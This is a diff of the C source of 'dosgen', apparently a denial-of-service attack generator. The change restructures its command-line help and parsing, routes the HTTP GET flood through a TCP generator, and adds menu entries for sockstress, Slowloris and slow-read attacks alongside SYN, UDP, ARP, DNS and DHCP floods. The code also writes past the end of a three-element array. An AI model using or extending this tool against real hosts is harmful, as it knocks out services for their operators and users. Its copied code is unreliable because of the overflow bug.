@@ -3,13 +3,19 @@
 #include <string.h>
 #include <stdlib.h>
 #include <stdbool.h>
+#include <unistd.h> //sleep
 
 #include "libdos.h"
+#include "raw/arpinglib.h"
+#include "raw/tcpgenlib.h"
 
 void print_help_and_die()
 {
-    printf("/-----------------DoSgen usage-----------------/\n\n"
-           "  Attacks:\n"
+    printf("\n/-----------------DoSgen usage-----------------/\n"
+           "\n  General options:\n"
+           "\t-i:\t interface (e.g. eth0)\n"
+           "\t-P:\t number of processes\n\n"
+           "  Attacks without handshake:\n"
            "\t--syn:\t\t SYN flood\n"
            "\t--rst:\t\t RST flood\n"
            "\t--udp:\t\t UDP flood\n"
@@ -17,19 +23,25 @@ void print_help_and_die()
            "\t--arp:\t\t ARP flood\n"
            "\t--dns:\t\t DNS flood\n"
            "\t--dhcp:\t\t DHCP starvation\n"
-		   "\t--http:\t\t HTTP GET flood\n\n"
-           "  Definitions:\n"
-           "\t-i:\t interface (e.g. eth0)\n"
-           "\t-P:\t number of processes\n"
+           "\n  Definitions:\n"
            "\t-s:\t source IP address\n"
            "\t-d:\t destination IP address\n"
            "\t-S:\t source port\n"
            "\t-D:\t destination port\n"
            "\t-n:\t DNS name\n"
-		   "\t-H:\t Host name\n"
-		   "\t-U:\t URI\n"
            "\t-p:\t payload length\n"
-           "\t-h:\t help, shows this message\n\n" );
+           "\t-h:\t help, shows this message\n\n"
+           "  Usage: ./dosgen -i <iface> [-P] <attack_type> -d <dest ip> [-s <source ip> -S <source port> -D <dest port> -p <payload len>] -n <DNS name> (in case of --dns attack)\n" 
+           "\n/----------------------------------------------/\n"
+           "\n  Attacks with handshake:\n"
+		   "\t--http:\t\t HTTP GET flood\n"
+		   "\t--sockstress:\t SockStress attack\n"
+		   "\t--slowloris:\t Slow Loris attack\n"
+		   "\t--slowread:\t Slow Read attack\n"
+           "\n  Definitions:\n"
+		   "\t-H:\t Host name\n"
+		   "\t-U:\t URI\n\n"
+           "  Usage: ./dosgen -i <iface> <attack_type> -H <host name | IP> -U <URI>\n\n"); 
     exit(100);
 }
 
@@ -300,7 +312,6 @@ void udp_flood(int argc, char **argv)
             dst_port = dst_port_buffer;
         }
 
-
         char *err = prepare_udp(src_ip, src_port, dst_ip, dst_port, payload_len);
         if (err != NULL)
         {
@@ -532,51 +543,42 @@ void dhcp_flood(int argc, char **argv)
 }
 
 //-------------------HTTP GET flood---------------------//
-void http_get_flood(int argc, char **argv)
+void http_get_flood(int argc, char **argv, char *dev)
 {
-	char *src_ip = "drnd(4)";
-	char *dst_ip = NULL;
 	char *host_name = NULL;
 	char *URI = NULL;
-	int payload_len = 0;
 	int c;
 
-	while((c = getopt(argc, argv, "s:d:H:U:p:h")) != -1)
+	while((c = getopt(argc, argv, "H:U:")) != -1)
 	{
 		switch(c)
 		{
-		case 's':
-			src_ip = optarg;
-			str_replace(src_ip, '.', ',');
-			break;
-		case 'd':
-			dst_ip = optarg;
-			str_replace(dst_ip, '.', ',');
-			break;
 		case 'H':
             host_name = optarg;
 			break;
-		case 'p':
-            payload_len = atoi(optarg);
-            break;	
-		/*case 'U':
-			if(optarg == "/")
-			{	printf("nice");
-			URI = "/";}
+		case 'U':
 			URI = optarg;
-			printf("U also..\n");
-			break;*/
+			break;
 		default:
-			printf("Something is missing!\n");
-			print_help_and_die();
+			printf("Missing one of the arguments!\n");
+            print_help_and_die();
 		}
 	}
-	char *err = prepare_http_get(src_ip, dst_ip, host_name, payload_len);
+    char *arguments[3];
+    arguments[0] = "./dosgen";
+    arguments[1] = host_name;
+    arguments[2] = URI;
+    arguments[3] = dev;
 
-	if (err != NULL)
-	{
-		printf("ERROR: %s\n", err);
-	}
+    //printf("gv[0]: %s, argv[1]: %s, argv[2]: %s, argv[3]: %s\n", arguments[0], arguments[1], arguments[2], arguments[3]);
+    argc = 4;    
+    tcp_gen(argc, arguments);
+	//char *err = prepare_http_get(src_ip, dst_ip, host_name, payload_len);
+
+	//if (err != NULL)
+	//{
+	//	printf("ERROR: %s\n", err);
+	//}
 
 }
 
@@ -611,8 +613,8 @@ bool find_flood(int argc, char **argv, int *flood_type_index, int *flood_argc)
 
 int main(int argc, char **argv)
 {
-	if (argc < 2) {
-		printf("\nYou have not specified enough arguments!\n -- Run again! --\n\n");
+	if (argc < 4) {
+		printf("\nNot specified enough arguments!\n -- Run again! --\n\n");
 		print_help_and_die();
 	}
 
@@ -624,14 +626,16 @@ int main(int argc, char **argv)
         {
             break;
         }
+        //Find point where --<name of the attack> begins and later pass it to find flood function
         else if (strncmp(argv[i], "--", 2) == 0)
         {
             break;
         }
+        //Increase i as long as strncmp at i position is not equal to --
         i++;
     }
     argc = i;
-
+    //printf("\nargc value is: %d\n", argc);
     // long unsigned pps = 0;
     int proc_num = 0;
     char *dev = NULL;
@@ -658,17 +662,22 @@ int main(int argc, char **argv)
             print_help_and_die();
         }
     }
+    //Num of cpu cores to run on
     char proc_num_str[10];
     sprintf(proc_num_str, "%u", proc_num);
     /*char pps_str[10];
     sprintf(pps_str, "%u", pps);*/
 
-    // Deleting the tmp file/Vymazani docasneho souboru
-    remove("tmp.cfg");
-
+    // Checking if file exists and Deleting it/Zjisteni jestli soubor existuje a jeho vymazani
+    if(access("tmp.cfg", F_OK) != -1){
+        if(remove("tmp.cfg") != 0)
+            perror("\ntmp.cfg not deleted!\n");
+    }
+    
     argc = argc_orig;
     argv++;
     argc--;
+    bool tcp_attack = false;
 
     int flood_type_index = 0;
     int flood_argc = 0;
@@ -716,11 +725,24 @@ int main(int argc, char **argv)
         {
             dhcp_flood(flood_argc + 1, flood_argv);
         }
-        // HTTP GET flood
+        // For these attacks arguments needed are: <hostname> <URI> <iface>
         else if (strcmp(flood_type, "--http") == 0)
         {
-            http_get_flood(flood_argc + 1, flood_argv);
+            tcp_attack = true;
+            http_get_flood(flood_argc + 1, flood_argv, dev);
         }
+        //else if (strcmp(flood_type, "--sockstress") == 0)
+        //{
+        //    sockstress(flood_argc + 1, flood_argv);
+        //}
+        //else if (strcmp(flood_type, "--slowloris") == 0)
+        //{
+        //    slowloris(flood_argc + 1, flood_argv);
+        //}
+        //else if (strcmp(flood_type, "--slowread") == 0)
+        //{
+        //    slowread(flood_argc + 1, flood_argv);
+        //}
 	else
         {
             print_help_and_die();
@@ -736,6 +758,9 @@ int main(int argc, char **argv)
     }
 
 // Starting the atack/Zahajeni utoku
-    start_attack(dev, proc_num_str); //pps_str
+    if(tcp_attack == false)
+        start_attack(dev, proc_num_str); //pps_str
+
+    return 0;
 }
 
